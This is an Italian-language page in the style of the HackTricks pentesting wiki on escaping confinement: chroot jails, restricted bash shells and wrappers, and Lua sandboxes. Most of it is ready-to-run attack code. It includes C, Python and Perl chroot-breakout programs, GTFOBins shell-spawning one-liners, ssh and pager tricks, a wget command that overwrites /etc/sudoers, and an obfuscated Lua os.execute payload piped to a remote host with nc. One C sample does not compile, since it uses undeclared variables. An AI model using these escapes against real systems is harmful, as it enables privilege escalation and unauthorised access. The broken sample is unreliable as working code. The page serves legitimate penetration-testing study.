# Evadere dalle Jail

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Cerca su** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire un binary con la proprietà "Shell"**

## Chroot Escapes

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): il meccanismo chroot **non è progettato per difendersi** da manomissioni intenzionali da parte di **utenti privilegiati** (**root**). Sulla maggior parte dei sistemi, i contesti chroot non si sovrappongono correttamente e i programmi chrootati **con privilegi sufficienti possono eseguire un secondo chroot per evadere**.\
Di solito, per evadere è necessario essere root all'interno del chroot.

> [!TIP]
> Il **tool** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per sfruttare i seguenti scenari ed evadere da `chroot`.

### Root + CWD

> [!WARNING]
> Se sei **root** all'interno di un chroot, **puoi evadere** creando **un altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux); quindi, se crei una cartella e poi **crei un nuovo chroot** in quella nuova cartella mentre **tu sei al di fuori di essa**, ora ti troverai **al di fuori del nuovo chroot** e quindi sarai nel FS.
>
> Questo accade perché di solito chroot NON sposta la tua directory di lavoro in quella indicata, quindi puoi creare un chroot ma rimanere al di fuori di esso.

Di solito non troverai il binary `chroot` all'interno di una chroot jail, ma **potresti compilare, caricare ed eseguire** un binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + FD salvato

> [!WARNING]
> È simile al caso precedente, ma in questo caso l'**attacker salva un file descriptor della directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **al di fuori** del chroot, vi accede e **fa escape**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD può essere passato tramite Unix Domain Sockets, quindi:
>
> - Crea un processo figlio (fork)
> - Crea un UDS in modo che il processo padre e il processo figlio possano comunicare
> - Esegui chroot nel processo figlio in una cartella diversa
> - Nel processo padre, crea un FD di una cartella che si trova al di fuori del chroot del nuovo processo figlio
> - Passa quell'FD al processo figlio usando l'UDS
> - Il processo figlio esegue chdir su quell'FD e, poiché si trova al di fuori del suo chroot, evaderà dalla jail

### Root + Mount

> [!WARNING]
>
> - Monta il dispositivo root (/) in una directory all'interno del chroot
> - Esegui chroot in quella directory
>
> Questo è possibile in Linux

### Root + /proc

> [!WARNING]
>
> - Monta procfs in una directory all'interno del chroot (se non è già presente)
> - Cerca un pid che abbia un'entry root/cwd diversa, come: /proc/1/root
> - Esegui chroot in quell'entry

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (processo figlio), esegui chroot in una cartella diversa più in profondità nel FS ed esegui CD su di essa
> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot dei processi figli
> - Questo processo figlio si troverà al di fuori del chroot

### ptrace

> [!WARNING]
>
> - In passato gli utenti potevano eseguire il debug dei propri processi da un processo appartenente a loro stessi... ma ora questo non è più possibile per impostazione predefinita
> - In ogni caso, se è possibile, potresti usare ptrace su un processo ed eseguire uno shellcode al suo interno ([vedi questo esempio](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Ottieni informazioni sulla jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modificare PATH

Verifica se puoi modificare la variabile d'ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Uso di vim
```bash
:set shell=/bin/sh
:shell
```
### Pager e visualizzatori della guida

Molti ambienti con restrizioni lasciano comunque disponibili **pager** o **visualizzatori della guida**. Di solito è più rapido abusarne che provare a ricostruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` è disponibile, ricorda che il suo output della guida passa solitamente attraverso un pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liner comuni di GTFOBins

Una volta individuati i binari raggiungibili, testa prima gli shell spawner più ovvi:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se puoi solo **iniettare argomenti** in un comando autorizzato (invece di eseguirlo liberamente), controlla anche **GTFOArgs**.

### Crea script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se accedi tramite ssh, spesso puoi chiedere al server di eseguire un **programma diverso** invece della shell di login con restrizioni:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può anche essere abusato come **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Dichiarare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

È possibile sovrascrivere, ad esempio, il file sudoers.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrapper di shell limitate (`git-shell`, `rssh`, `lshell`)

Alcuni ambienti non inseriscono l'utente in una semplice `rbash`, ma in **wrapper** come `git-shell`, `rssh` o `lshell`:

- `git-shell` accetta solo comandi Git lato server e qualsiasi elemento presente in `~/git-shell-commands/`. Se la directory esiste, esegui `help` per elencare le azioni personalizzate consentite. Se puoi **scriverci**, qualsiasi eseguibile inserito in quella directory diventa raggiungibile.
- `rssh` / `lshell` consentono comunemente solo operazioni `scp`, `sftp`, `rsync` o in stile Git. In questi casi concentrati prima sulle **primitive di scrittura dei file**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile, quindi riconnettiti con `ssh -t ...`.
- Se il wrapper filtra solo la command line, enumera i binari raggiungibili e poi passa a **GTFOBins / GTFOArgs**.

### Altri trucchi

Controlla anche:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Potrebbe essere interessante anche la pagina:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jail

Trucchi per evadere dai python jail nella seguente pagina:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jail

In questa pagina puoi trovare le funzioni globali a cui hai accesso all'interno di lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval con esecuzione di comandi:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare funzioni di una libreria senza usare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerare le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il precedente **one liner** in un **diverso ambiente lua, l’ordine delle funzioni cambia**. Pertanto, se devi eseguire una funzione specifica, puoi effettuare un **brute force attack** caricando diversi ambienti lua e chiamando la prima funzione della libreria:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Get interactive lua shell**: Se ti trovi all'interno di una limited lua shell, puoi ottenere una nuova lua shell (e, si spera, illimitata) eseguendo:
```bash
debug.debug()
```
## Riferimenti

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break_Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
